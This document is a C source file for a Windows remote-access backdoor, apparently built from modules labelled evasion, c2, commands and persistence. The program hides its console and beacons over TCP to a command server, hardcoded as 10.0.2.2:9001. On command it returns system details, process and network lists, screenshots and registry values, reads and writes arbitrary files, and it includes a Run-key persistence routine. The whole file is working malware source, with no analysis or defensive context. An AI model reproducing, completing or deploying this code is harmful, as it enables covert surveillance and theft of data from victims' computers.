#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <stdint.h>
#include <tlhelp32.h>
#include <iphlpapi.h>


#define BEACON_INTERVAL_MS 30000

/* ── evasion/behavioral_pacing ── */
static volatile DWORD g_sink = 0;

static void pace(DWORD base_ms, DWORD jitter_ms) {
    DWORD actual = base_ms + (GetTickCount() % (jitter_ms + 1));
    LARGE_INTEGER freq, t0, t1;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t0);
    for (;;) {
        QueryPerformanceCounter(&t1);
        if ((DWORD)((t1.QuadPart - t0.QuadPart) * 1000 / freq.QuadPart) >= actual) break;
        SwitchToThread();
    }
}

static void decoy_work(void) {
    POINT pt; GetCursorPos(&pt);
    g_sink += pt.x + pt.y;
    HWND dw = GetDesktopWindow();
    RECT rc; GetWindowRect(dw, &rc);
    g_sink += rc.right + rc.bottom;
    g_sink += GetTickCount();
}


/* ── core/emit_buffer ── */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <windows.h>

#define COLLECT_BUF (1024 * 1024)

static char *g_data = NULL;
static DWORD g_pos = 0;
static DWORD g_cap = 0;

static void init_buffer(void) {
    g_data = (char *)malloc(COLLECT_BUF);
    if (g_data) g_cap = COLLECT_BUF;
    g_pos = 0;
}

static void emit(const char *d, DWORD n) {
    if (!g_data) return;
    if (g_pos + n >= g_cap) {
        DWORD need = g_pos + n + (256 * 1024);
        char *re = (char *)realloc(g_data, need);
        if (!re) return;
        g_data = re;
        g_cap = need;
    }
    memcpy(g_data + g_pos, d, n);
    g_pos += n;
}

static void emitf(const char *fmt, ...) {
    char tmp[4096];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n > 0) emit(tmp, (DWORD)n);
}


/* ── core/file_ops ── */
static int file_exists(const char *path) {
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
}

static void emit_file(const char *path, DWORD max_sz) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD sz = GetFileSize(h, NULL);
    if (sz == 0 || sz > max_sz) { CloseHandle(h); return; }
    BYTE *buf = (BYTE *)malloc(sz);
    if (buf) {
        DWORD rd;
        if (ReadFile(h, buf, sz, &rd, NULL) && rd > 0)
            emit((const char *)buf, rd);
        free(buf);
    }
    CloseHandle(h);
}

static void grab_file(const char *src, const char *tag, DWORD max_sz) {
    char temp[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);
    char dst[MAX_PATH];
    snprintf(dst, MAX_PATH, "%s\\~%lx.tmp", temp, GetTickCount());
    if (CopyFileA(src, dst, FALSE)) {
        HANDLE hc = CreateFileA(dst, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        DWORD fsz = (hc != INVALID_HANDLE_VALUE) ? GetFileSize(hc, NULL) : 0;
        if (hc != INVALID_HANDLE_VALUE) CloseHandle(hc);
        emitf("  [%s] %lu bytes\r\n", tag, (unsigned long)fsz);
        emit_file(dst, max_sz);
        DeleteFileA(dst);
    }
}


/* ── c2/tcp_beacon ── */
#define C2_ADDR "10.0.2.2"
#define C2_PORT 9001

#pragma pack(push, 1)
typedef struct { uint32_t cmd_id; uint32_t payload_len; } c2_hdr_t;
#pragma pack(pop)

#define C2_CMD_HEARTBEAT    0x01
#define C2_CMD_SYSINFO      0x02
#define C2_CMD_PROCESSES    0x03
#define C2_CMD_FILELIST     0x04
#define C2_CMD_FILEREAD     0x05
#define C2_CMD_FILEWRITE    0x06
#define C2_CMD_SCREENSHOT   0x07
#define C2_CMD_REGISTRY     0x08
#define C2_CMD_NETINFO      0x09
#define C2_CMD_EXEC         0x0A
#define C2_CMD_EXEC_PS      0x0B
#define C2_CMD_EXIT         0x0D
#define C2_CMD_NOOP         0xFF

static SOCKET g_c2_sock = INVALID_SOCKET;
static int g_wsa_init = 0;

static int c2_recv_exact(void *buf, DWORD len) {
    DWORD got = 0;
    while (got < len) {
        int n = recv(g_c2_sock, (char *)buf + got, (int)(len - got), 0);
        if (n <= 0) return 0;
        got += n;
    }
    return 1;
}

static int c2_send_exact(const void *buf, DWORD len) {
    DWORD sent = 0;
    while (sent < len) {
        DWORD chunk = (len - sent > 32768) ? 32768 : (len - sent);
        int n = send(g_c2_sock, (const char *)buf + sent, (int)chunk, 0);
        if (n <= 0) return 0;
        sent += n;
    }
    return 1;
}

static int c2_connect(const char *ip, int port) {
    if (!g_wsa_init) {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 0;
        g_wsa_init = 1;
    }

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((WORD)port);
    addr.sin_addr.s_addr = inet_addr(ip);

    int retries = 3;
    while (retries-- > 0) {
        g_c2_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (g_c2_sock == INVALID_SOCKET) return 0;

        if (connect(g_c2_sock, (struct sockaddr *)&addr, sizeof(addr)) != SOCKET_ERROR)
            return 1;

        closesocket(g_c2_sock);
        g_c2_sock = INVALID_SOCKET;
        if (retries > 0) Sleep(2000);
    }
    return 0;
}

static void c2_disconnect(void) {
    if (g_c2_sock != INVALID_SOCKET) {
        closesocket(g_c2_sock);
        g_c2_sock = INVALID_SOCKET;
    }
    if (g_wsa_init) {
        WSACleanup();
        g_wsa_init = 0;
    }
}

static int c2_recv_cmd(c2_hdr_t *hdr, char *payload, DWORD max_len) {
    if (!c2_recv_exact(hdr, sizeof(c2_hdr_t))) return 0;
    if (hdr->payload_len == 0) return 1;
    if (hdr->payload_len > max_len) return 0;
    return c2_recv_exact(payload, hdr->payload_len);
}

static int c2_send_result(uint32_t cmd_id, const char *data, DWORD len) {
    c2_hdr_t hdr;
    hdr.cmd_id = cmd_id;
    hdr.payload_len = len;
    if (!c2_send_exact(&hdr, sizeof(hdr))) return 0;
    if (len > 0 && data) return c2_send_exact(data, len);
    return 1;
}

static int c2_heartbeat(void) {
    DWORD tick = GetTickCount();
    return c2_send_result((uint32_t)C2_CMD_HEARTBEAT, (const char *)&tick, sizeof(tick));
}


/* ── commands/cmd_sysinfo ── */
static int cmd_sysinfo(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    (void)args; (void)args_len;
    DWORD cap = *out_len;
    int pos = 0;

    char hostname[256] = {0};
    DWORD hlen = sizeof(hostname);
    if (GetComputerNameA(hostname, &hlen))
        pos += snprintf(out + pos, cap - pos, "Hostname: %s\r\n", hostname);

    char *user = getenv("USERNAME");
    if (user) pos += snprintf(out + pos, cap - pos, "Username: %s\r\n", user);

    OSVERSIONINFOA ov;
    ZeroMemory(&ov, sizeof(ov));
    ov.dwOSVersionInfoSize = sizeof(ov);
    GetVersionExA(&ov);
    pos += snprintf(out + pos, cap - pos, "OS: Windows %lu.%lu Build %lu\r\n",
                    ov.dwMajorVersion, ov.dwMinorVersion, ov.dwBuildNumber);

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    pos += snprintf(out + pos, cap - pos, "Arch: %s  CPUs: %lu\r\n",
                    si.wProcessorArchitecture == 9 ? "x64" :
                    si.wProcessorArchitecture == 12 ? "ARM64" : "x86",
                    si.dwNumberOfProcessors);

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms))
        pos += snprintf(out + pos, cap - pos, "RAM: %llu MB\r\n",
                        ms.ullTotalPhys / (1024 * 1024));

    char windir[MAX_PATH] = {0};
    GetWindowsDirectoryA(windir, MAX_PATH);
    pos += snprintf(out + pos, cap - pos, "WinDir: %s\r\n", windir);

    *out_len = (DWORD)pos;
    return 0;
}


/* ── commands/cmd_processes ── */
#include <tlhelp32.h>

static int cmd_processes(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    (void)args; (void)args_len;
    DWORD cap = *out_len;
    int pos = 0;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        *out_len = 0;
        return 1;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if ((DWORD)pos >= cap - 128) break;
            pos += snprintf(out + pos, cap - pos, "[%5lu] %s\r\n",
                            pe.th32ProcessID, pe.szExeFile);
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    *out_len = (DWORD)pos;
    return 0;
}


/* ── commands/cmd_filelist ── */
static int cmd_filelist(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    DWORD cap = *out_len;
    int pos = 0;

    char pattern[MAX_PATH];
    if (args_len == 0 || !args) {
        strncpy(pattern, "C:\\Users\\*", sizeof(pattern) - 1);
    } else {
        char dir[MAX_PATH] = {0};
        DWORD cplen = (args_len < MAX_PATH - 3) ? args_len : MAX_PATH - 3;
        memcpy(dir, args, cplen);
        dir[cplen] = '\0';
        while (cplen > 0 && (dir[cplen - 1] == '\r' || dir[cplen - 1] == '\n'))
            dir[--cplen] = '\0';
        if (dir[cplen - 1] == '\\')
            snprintf(pattern, sizeof(pattern), "%s*", dir);
        else
            snprintf(pattern, sizeof(pattern), "%s\\*", dir);
    }

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        pos += snprintf(out + pos, cap - pos, "Error: cannot list %s\r\n", pattern);
        *out_len = (DWORD)pos;
        return 1;
    }

    do {
        if ((DWORD)pos >= cap - 512) break;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            pos += snprintf(out + pos, cap - pos, "d %s\r\n", fd.cFileName);
        } else {
            ULARGE_INTEGER sz;
            sz.LowPart = fd.nFileSizeLow;
            sz.HighPart = fd.nFileSizeHigh;
            pos += snprintf(out + pos, cap - pos, "f %s (%llu bytes)\r\n",
                            fd.cFileName, sz.QuadPart);
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    *out_len = (DWORD)pos;
    return 0;
}


/* ── commands/cmd_fileread ── */
#define CMD_FILEREAD_MAX (512 * 1024)

static int cmd_fileread(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    DWORD cap = *out_len;
    if (args_len == 0 || !args) {
        *out_len = 0;
        return 1;
    }

    char path[MAX_PATH] = {0};
    DWORD cplen = (args_len < MAX_PATH - 1) ? args_len : MAX_PATH - 1;
    memcpy(path, args, cplen);
    while (cplen > 0 && (path[cplen - 1] == '\r' || path[cplen - 1] == '\n'))
        path[--cplen] = '\0';

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        int n = snprintf(out, cap, "Error: cannot open %s\r\n", path);
        *out_len = (DWORD)n;
        return 1;
    }

    DWORD file_sz = GetFileSize(hFile, NULL);
    DWORD to_read = file_sz;
    if (to_read > CMD_FILEREAD_MAX) to_read = CMD_FILEREAD_MAX;
    if (to_read > cap) to_read = cap;

    DWORD rd = 0;
    ReadFile(hFile, out, to_read, &rd, NULL);
    CloseHandle(hFile);

    *out_len = rd;
    return 0;
}


/* ── commands/cmd_filewrite ── */
static int cmd_filewrite(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    DWORD cap = *out_len;
    if (args_len == 0 || !args) {
        *out_len = 0;
        return 1;
    }

    const char *nl = memchr(args, '\n', args_len);
    if (!nl) {
        int n = snprintf(out, cap, "Error: format is PATH\\nCONTENT\r\n");
        *out_len = (DWORD)n;
        return 1;
    }

    char path[MAX_PATH] = {0};
    DWORD plen = (DWORD)(nl - args);
    if (plen >= MAX_PATH) plen = MAX_PATH - 1;
    memcpy(path, args, plen);
    while (plen > 0 && (path[plen - 1] == '\r' || path[plen - 1] == '\n'))
        path[--plen] = '\0';

    const char *content = nl + 1;
    DWORD content_len = args_len - (DWORD)(content - args);

    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        int n = snprintf(out, cap, "Error: cannot create %s\r\n", path);
        *out_len = (DWORD)n;
        return 1;
    }

    DWORD written = 0;
    WriteFile(hFile, content, content_len, &written, NULL);
    CloseHandle(hFile);

    int n = snprintf(out, cap, "OK: wrote %lu bytes to %s\r\n", written, path);
    *out_len = (DWORD)n;
    return 0;
}


/* ── commands/cmd_screenshot ── */
static int cmd_screenshot(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    (void)args; (void)args_len;
    DWORD cap = *out_len;

    HDC hScreen = GetDC(NULL);
    if (!hScreen) { *out_len = 0; return 1; }

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hMem, hBmp);
    BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    DWORD row = ((w * 3 + 3) & ~3);
    DWORD img_sz = row * h;

    BITMAPFILEHEADER bf = {0};
    bf.bfType = 0x4D42;
    bf.bfSize = sizeof(bf) + sizeof(bi) + img_sz;
    bf.bfOffBits = sizeof(bf) + sizeof(bi);

    DWORD total = sizeof(bf) + sizeof(bi) + img_sz;
    if (total > cap) {
        DeleteObject(hBmp); DeleteDC(hMem); ReleaseDC(NULL, hScreen);
        *out_len = 0;
        return 1;
    }

    BYTE *pixels = (BYTE *)malloc(img_sz);
    if (!pixels) {
        DeleteObject(hBmp); DeleteDC(hMem); ReleaseDC(NULL, hScreen);
        *out_len = 0;
        return 1;
    }

    GetDIBits(hMem, hBmp, 0, h, pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    memcpy(out, &bf, sizeof(bf));
    memcpy(out + sizeof(bf), &bi, sizeof(bi));
    memcpy(out + sizeof(bf) + sizeof(bi), pixels, img_sz);
    *out_len = total;

    free(pixels);
    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
    return 0;
}


/* ── commands/cmd_registry ── */
static HKEY reg_parse_root(const char *path, const char **subkey) {
    if (strncmp(path, "HKLM\\", 5) == 0) { *subkey = path + 5; return HKEY_LOCAL_MACHINE; }
    if (strncmp(path, "HKCU\\", 5) == 0) { *subkey = path + 5; return HKEY_CURRENT_USER; }
    if (strncmp(path, "HKCR\\", 5) == 0) { *subkey = path + 5; return HKEY_CLASSES_ROOT; }
    if (strncmp(path, "HKU\\", 4) == 0) { *subkey = path + 4; return HKEY_USERS; }
    if (strncmp(path, "HKEY_LOCAL_MACHINE\\", 18) == 0) { *subkey = path + 18; return HKEY_LOCAL_MACHINE; }
    if (strncmp(path, "HKEY_CURRENT_USER\\", 18) == 0) { *subkey = path + 18; return HKEY_CURRENT_USER; }
    *subkey = path;
    return HKEY_LOCAL_MACHINE;
}

static int cmd_registry(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    DWORD cap = *out_len;
    int pos = 0;

    if (args_len == 0 || !args) {
        pos = snprintf(out, cap, "Error: provide registry path\r\n");
        *out_len = (DWORD)pos;
        return 1;
    }

    char path[512] = {0};
    DWORD cplen = (args_len < sizeof(path) - 1) ? args_len : sizeof(path) - 1;
    memcpy(path, args, cplen);
    while (cplen > 0 && (path[cplen - 1] == '\r' || path[cplen - 1] == '\n'))
        path[--cplen] = '\0';

    const char *subkey = NULL;
    HKEY root = reg_parse_root(path, &subkey);

    HKEY hKey;
    if (RegOpenKeyExA(root, subkey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        pos = snprintf(out, cap, "Error: cannot open %s\r\n", path);
        *out_len = (DWORD)pos;
        return 1;
    }

    char name[256];
    BYTE data[1024];
    for (DWORD i = 0; i < 256; i++) {
        DWORD name_len = sizeof(name);
        DWORD data_len = sizeof(data);
        DWORD type = 0;
        LONG rc = RegEnumValueA(hKey, i, name, &name_len, NULL, &type, data, &data_len);
        if (rc != ERROR_SUCCESS) break;
        if ((DWORD)pos >= cap - 1280) break;

        switch (type) {
            case REG_SZ:
            case REG_EXPAND_SZ:
                pos += snprintf(out + pos, cap - pos, "%s = \"%s\"\r\n", name, (char *)data);
                break;
            case REG_DWORD:
                if (data_len >= 4)
                    pos += snprintf(out + pos, cap - pos, "%s = 0x%08lX\r\n",
                                    name, *(DWORD *)data);
                break;
            default:
                pos += snprintf(out + pos, cap - pos, "%s = (type %lu, %lu bytes)\r\n",
                                name, type, data_len);
                break;
        }
    }

    RegCloseKey(hKey);
    *out_len = (DWORD)pos;
    return 0;
}


/* ── commands/cmd_netinfo ── */
#include <iphlpapi.h>

static int cmd_netinfo(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    (void)args; (void)args_len;
    DWORD cap = *out_len;
    int pos = 0;

    pos += snprintf(out + pos, cap - pos, "=== ADAPTERS ===\r\n");

    ULONG buf_sz = 16384;
    IP_ADAPTER_INFO *info = (IP_ADAPTER_INFO *)malloc(buf_sz);
    if (info && GetAdaptersInfo(info, &buf_sz) == ERROR_SUCCESS) {
        IP_ADAPTER_INFO *a = info;
        while (a && (DWORD)pos < cap - 512) {
            pos += snprintf(out + pos, cap - pos, "%s\r\n", a->Description);
            pos += snprintf(out + pos, cap - pos, "  IP: %s\r\n", a->IpAddressList.IpAddress.String);
            pos += snprintf(out + pos, cap - pos, "  GW: %s\r\n", a->GatewayList.IpAddress.String);
            pos += snprintf(out + pos, cap - pos, "  MAC: %02X-%02X-%02X-%02X-%02X-%02X\r\n",
                            a->Address[0], a->Address[1], a->Address[2],
                            a->Address[3], a->Address[4], a->Address[5]);
            a = a->Next;
        }
    }
    if (info) free(info);

    pos += snprintf(out + pos, cap - pos, "\r\n=== TCP CONNECTIONS ===\r\n");

    DWORD tcp_sz = 0;
    GetExtendedTcpTable(NULL, &tcp_sz, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    if (tcp_sz > 0) {
        MIB_TCPTABLE_OWNER_PID *tcp = (MIB_TCPTABLE_OWNER_PID *)malloc(tcp_sz);
        if (tcp && GetExtendedTcpTable(tcp, &tcp_sz, FALSE, AF_INET,
                                        TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
            for (DWORD i = 0; i < tcp->dwNumEntries && (DWORD)pos < cap - 256; i++) {
                MIB_TCPROW_OWNER_PID *r = &tcp->table[i];
                if (r->dwState != MIB_TCP_STATE_ESTAB && r->dwState != MIB_TCP_STATE_LISTEN)
                    continue;
                struct in_addr la, ra;
                la.s_addr = r->dwLocalAddr;
                ra.s_addr = r->dwRemoteAddr;
                char local_ip[16], remote_ip[16];
                strncpy(local_ip, inet_ntoa(la), sizeof(local_ip) - 1);
                strncpy(remote_ip, inet_ntoa(ra), sizeof(remote_ip) - 1);
                pos += snprintf(out + pos, cap - pos, "  %s:%d -> %s:%d [PID %lu] %s\r\n",
                                local_ip, ntohs((u_short)r->dwLocalPort),
                                remote_ip, ntohs((u_short)r->dwRemotePort),
                                r->dwOwningPid,
                                r->dwState == MIB_TCP_STATE_LISTEN ? "LISTEN" : "ESTAB");
            }
        }
        if (tcp) free(tcp);
    }

    *out_len = (DWORD)pos;
    return 0;
}


/* ── persist/registry_run ── */
#include <windows.h>

static int persist_registry_run(const char *value_name) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS)
        return 0;

    LONG r = RegSetValueExA(hk, value_name, 0, REG_SZ,
                            (BYTE *)path, (DWORD)strlen(path) + 1);
    RegCloseKey(hk);
    return r == ERROR_SUCCESS;
}


/* ── arch/backdoor ── */
#ifdef USE_OBF_SLEEP
#define BEACON_SLEEP(ms) obf_sleep(ms)
#else
#define BEACON_SLEEP(ms) Sleep(ms)
#endif

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    FreeConsole();
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

    
    Sleep(3000 + (GetTickCount() % 5000));

    int max_retries = 100;
    while (max_retries-- > 0) {
        if (!c2_connect(C2_ADDR, C2_PORT)) {
            BEACON_SLEEP(30000 + (GetTickCount() % 90000));
            continue;
        }
        max_retries = 100;
        c2_heartbeat();

        char *cmd_buf = (char *)malloc(1024 * 1024);
        char *out_buf = (char *)malloc(1024 * 1024);
        if (!cmd_buf || !out_buf) { free(cmd_buf); free(out_buf); break; }

        while (1) {
            c2_hdr_t hdr;
            if (!c2_recv_cmd(&hdr, cmd_buf, 1024 * 1024)) break;

            DWORD out_len = 1024 * 1024;
            int rc = 0;

            switch (hdr.cmd_id) {
                case 0x01:
                    c2_heartbeat();
                    continue;
                                case 0x02: rc = cmd_sysinfo(cmd_buf, hdr.payload_len, out_buf, &out_len); break;
                case 0x03: rc = cmd_processes(cmd_buf, hdr.payload_len, out_buf, &out_len); break;
                case 0x04: rc = cmd_filelist(cmd_buf, hdr.payload_len, out_buf, &out_len); break;
                case 0x05: rc = cmd_fileread(cmd_buf, hdr.payload_len, out_buf, &out_len); break;
                case 0x06: rc = cmd_filewrite(cmd_buf, hdr.payload_len, out_buf, &out_len); break;
                case 0x07: rc = cmd_screenshot(cmd_buf, hdr.payload_len, out_buf, &out_len); break;
                case 0x08: rc = cmd_registry(cmd_buf, hdr.payload_len, out_buf, &out_len); break;
                case 0x09: rc = cmd_netinfo(cmd_buf, hdr.payload_len, out_buf, &out_len); break;
                case 0x0D:
                    c2_send_result(0x0D, "bye", 3);
                    free(cmd_buf); free(out_buf);
                    c2_disconnect();
                    return 0;
                case 0xFF:
                    continue;
                default:
                    c2_send_result(hdr.cmd_id, "ERR:unknown", 11);
                    continue;
            }

            if (rc == 0) {
                c2_send_result(hdr.cmd_id, out_buf, out_len);
            } else {
                c2_send_result(hdr.cmd_id, "ERR:failed", 10);
            }

            Sleep(100 + (GetTickCount() % 500));
        }

        free(cmd_buf); free(out_buf);
        c2_disconnect();
        BEACON_SLEEP(30000 + (GetTickCount() % 90000));
    }
    return 0;
}


